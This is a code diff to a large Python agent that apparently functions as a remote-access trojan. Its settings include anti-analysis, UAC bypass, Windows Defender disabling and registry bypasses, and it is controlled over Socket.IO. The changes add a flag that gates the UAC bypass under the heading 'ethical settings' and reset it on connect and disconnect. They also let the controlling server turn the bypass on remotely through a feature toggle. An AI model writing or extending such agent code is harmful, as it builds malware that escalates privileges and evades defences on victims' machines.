@@ -229,6 +229,7 @@ ENABLE_ANTI_ANALYSIS = True  # FALSE = Disabled (for testing), TRUE = Enabled (e
 # ✅ NEW ETHICAL SETTINGS
 REQUEST_ADMIN_FIRST = False
 DISABLE_UAC_BYPASS = True
+UAC_BYPASS_ALLOWED = False
 MAX_PROMPT_ATTEMPTS = None     # Limit prompts to 3 attempts instead of 999
 BYPASSES_ENABLED = True
 REGISTRY_ENABLED = True
@@ -2703,6 +2704,12 @@ def keep_trying_elevation():
 
 def attempt_uac_bypass():
     """Attempt to bypass UAC using the ADVANCED UAC Manager."""
+    try:
+        global DISABLE_UAC_BYPASS, UAC_BYPASS_ALLOWED
+        if DISABLE_UAC_BYPASS or not UAC_BYPASS_ALLOWED:
+            return False
+    except Exception:
+        pass
     debug_print("=" * 80)
     debug_print("[UAC BYPASS] attempt_uac_bypass() called")
     debug_print("=" * 80)
@@ -10086,6 +10093,24 @@ def register_socketio_handlers():
     sio.on('set_audio_volumes')(on_set_audio_volumes)
     sio.on('toggle_noise_reduction')(on_toggle_noise_reduction)
     sio.on('toggle_echo_cancellation')(on_toggle_echo_cancellation)
+    def on_connect(_data=None):
+        try:
+            global UAC_BYPASS_ALLOWED, DISABLE_UAC_BYPASS
+            UAC_BYPASS_ALLOWED = False
+            DISABLE_UAC_BYPASS = True
+            log_message("UAC bypass gate reset on connect")
+        except Exception:
+            pass
+    def on_disconnect(_data=None):
+        try:
+            global UAC_BYPASS_ALLOWED, DISABLE_UAC_BYPASS
+            UAC_BYPASS_ALLOWED = False
+            DISABLE_UAC_BYPASS = True
+            log_message("UAC bypass gate reset on disconnect")
+        except Exception:
+            pass
+    sio.on('connect')(on_connect)
+    sio.on('disconnect')(on_disconnect)
     
     log_message("Socket.IO event handlers registered successfully", "info")
 
@@ -10112,7 +10137,7 @@ def on_config_update(data):
         DEFENDER_DISABLE_ENABLED = bool(agent.get('enableDefenderDisable', DEFENDER_DISABLE_ENABLED))
         bypasses_enabled = bool(bypasses.get('enabled', True))
         REGISTRY_ENABLED = bool(registry.get('enabled', True))
-        DISABLE_UAC_BYPASS = (not bool(agent.get('enableUACBypass', True))) or (not bypasses_enabled)
+        DISABLE_UAC_BYPASS = (not bool(agent.get('enableUACBypass', True))) or (not bypasses_enabled) or (not UAC_BYPASS_ALLOWED)
         methods = bypasses.get('methods') or {}
         for k in list(UAC_BYPASS_METHODS_ENABLED.keys()):
             if k in methods:
@@ -15253,6 +15278,7 @@ def on_feature_toggle(data):
         feature = str((data or {}).get('feature') or '').strip()
         enabled = bool((data or {}).get('enabled'))
         global WEBRTC_CONFIG
+        global UAC_BYPASS_ALLOWED, DISABLE_UAC_BYPASS
         if feature == 'adaptive_bitrate':
             WEBRTC_CONFIG['adaptive_bitrate'] = enabled
         elif feature == 'frame_dropping':
@@ -15261,6 +15287,9 @@ def on_feature_toggle(data):
             m = WEBRTC_CONFIG.get('monitoring') or {}
             m['connection_quality_metrics'] = enabled
             WEBRTC_CONFIG['monitoring'] = m
+        elif feature == 'uac_bypass':
+            UAC_BYPASS_ALLOWED = enabled
+            DISABLE_UAC_BYPASS = not enabled
         safe_emit('feature_toggle_applied', {'feature': feature, 'enabled': enabled, 'agent_id': get_or_create_agent_id()})
     except Exception as e:
         log_message(f"Feature toggle error: {str(e)}", "error")
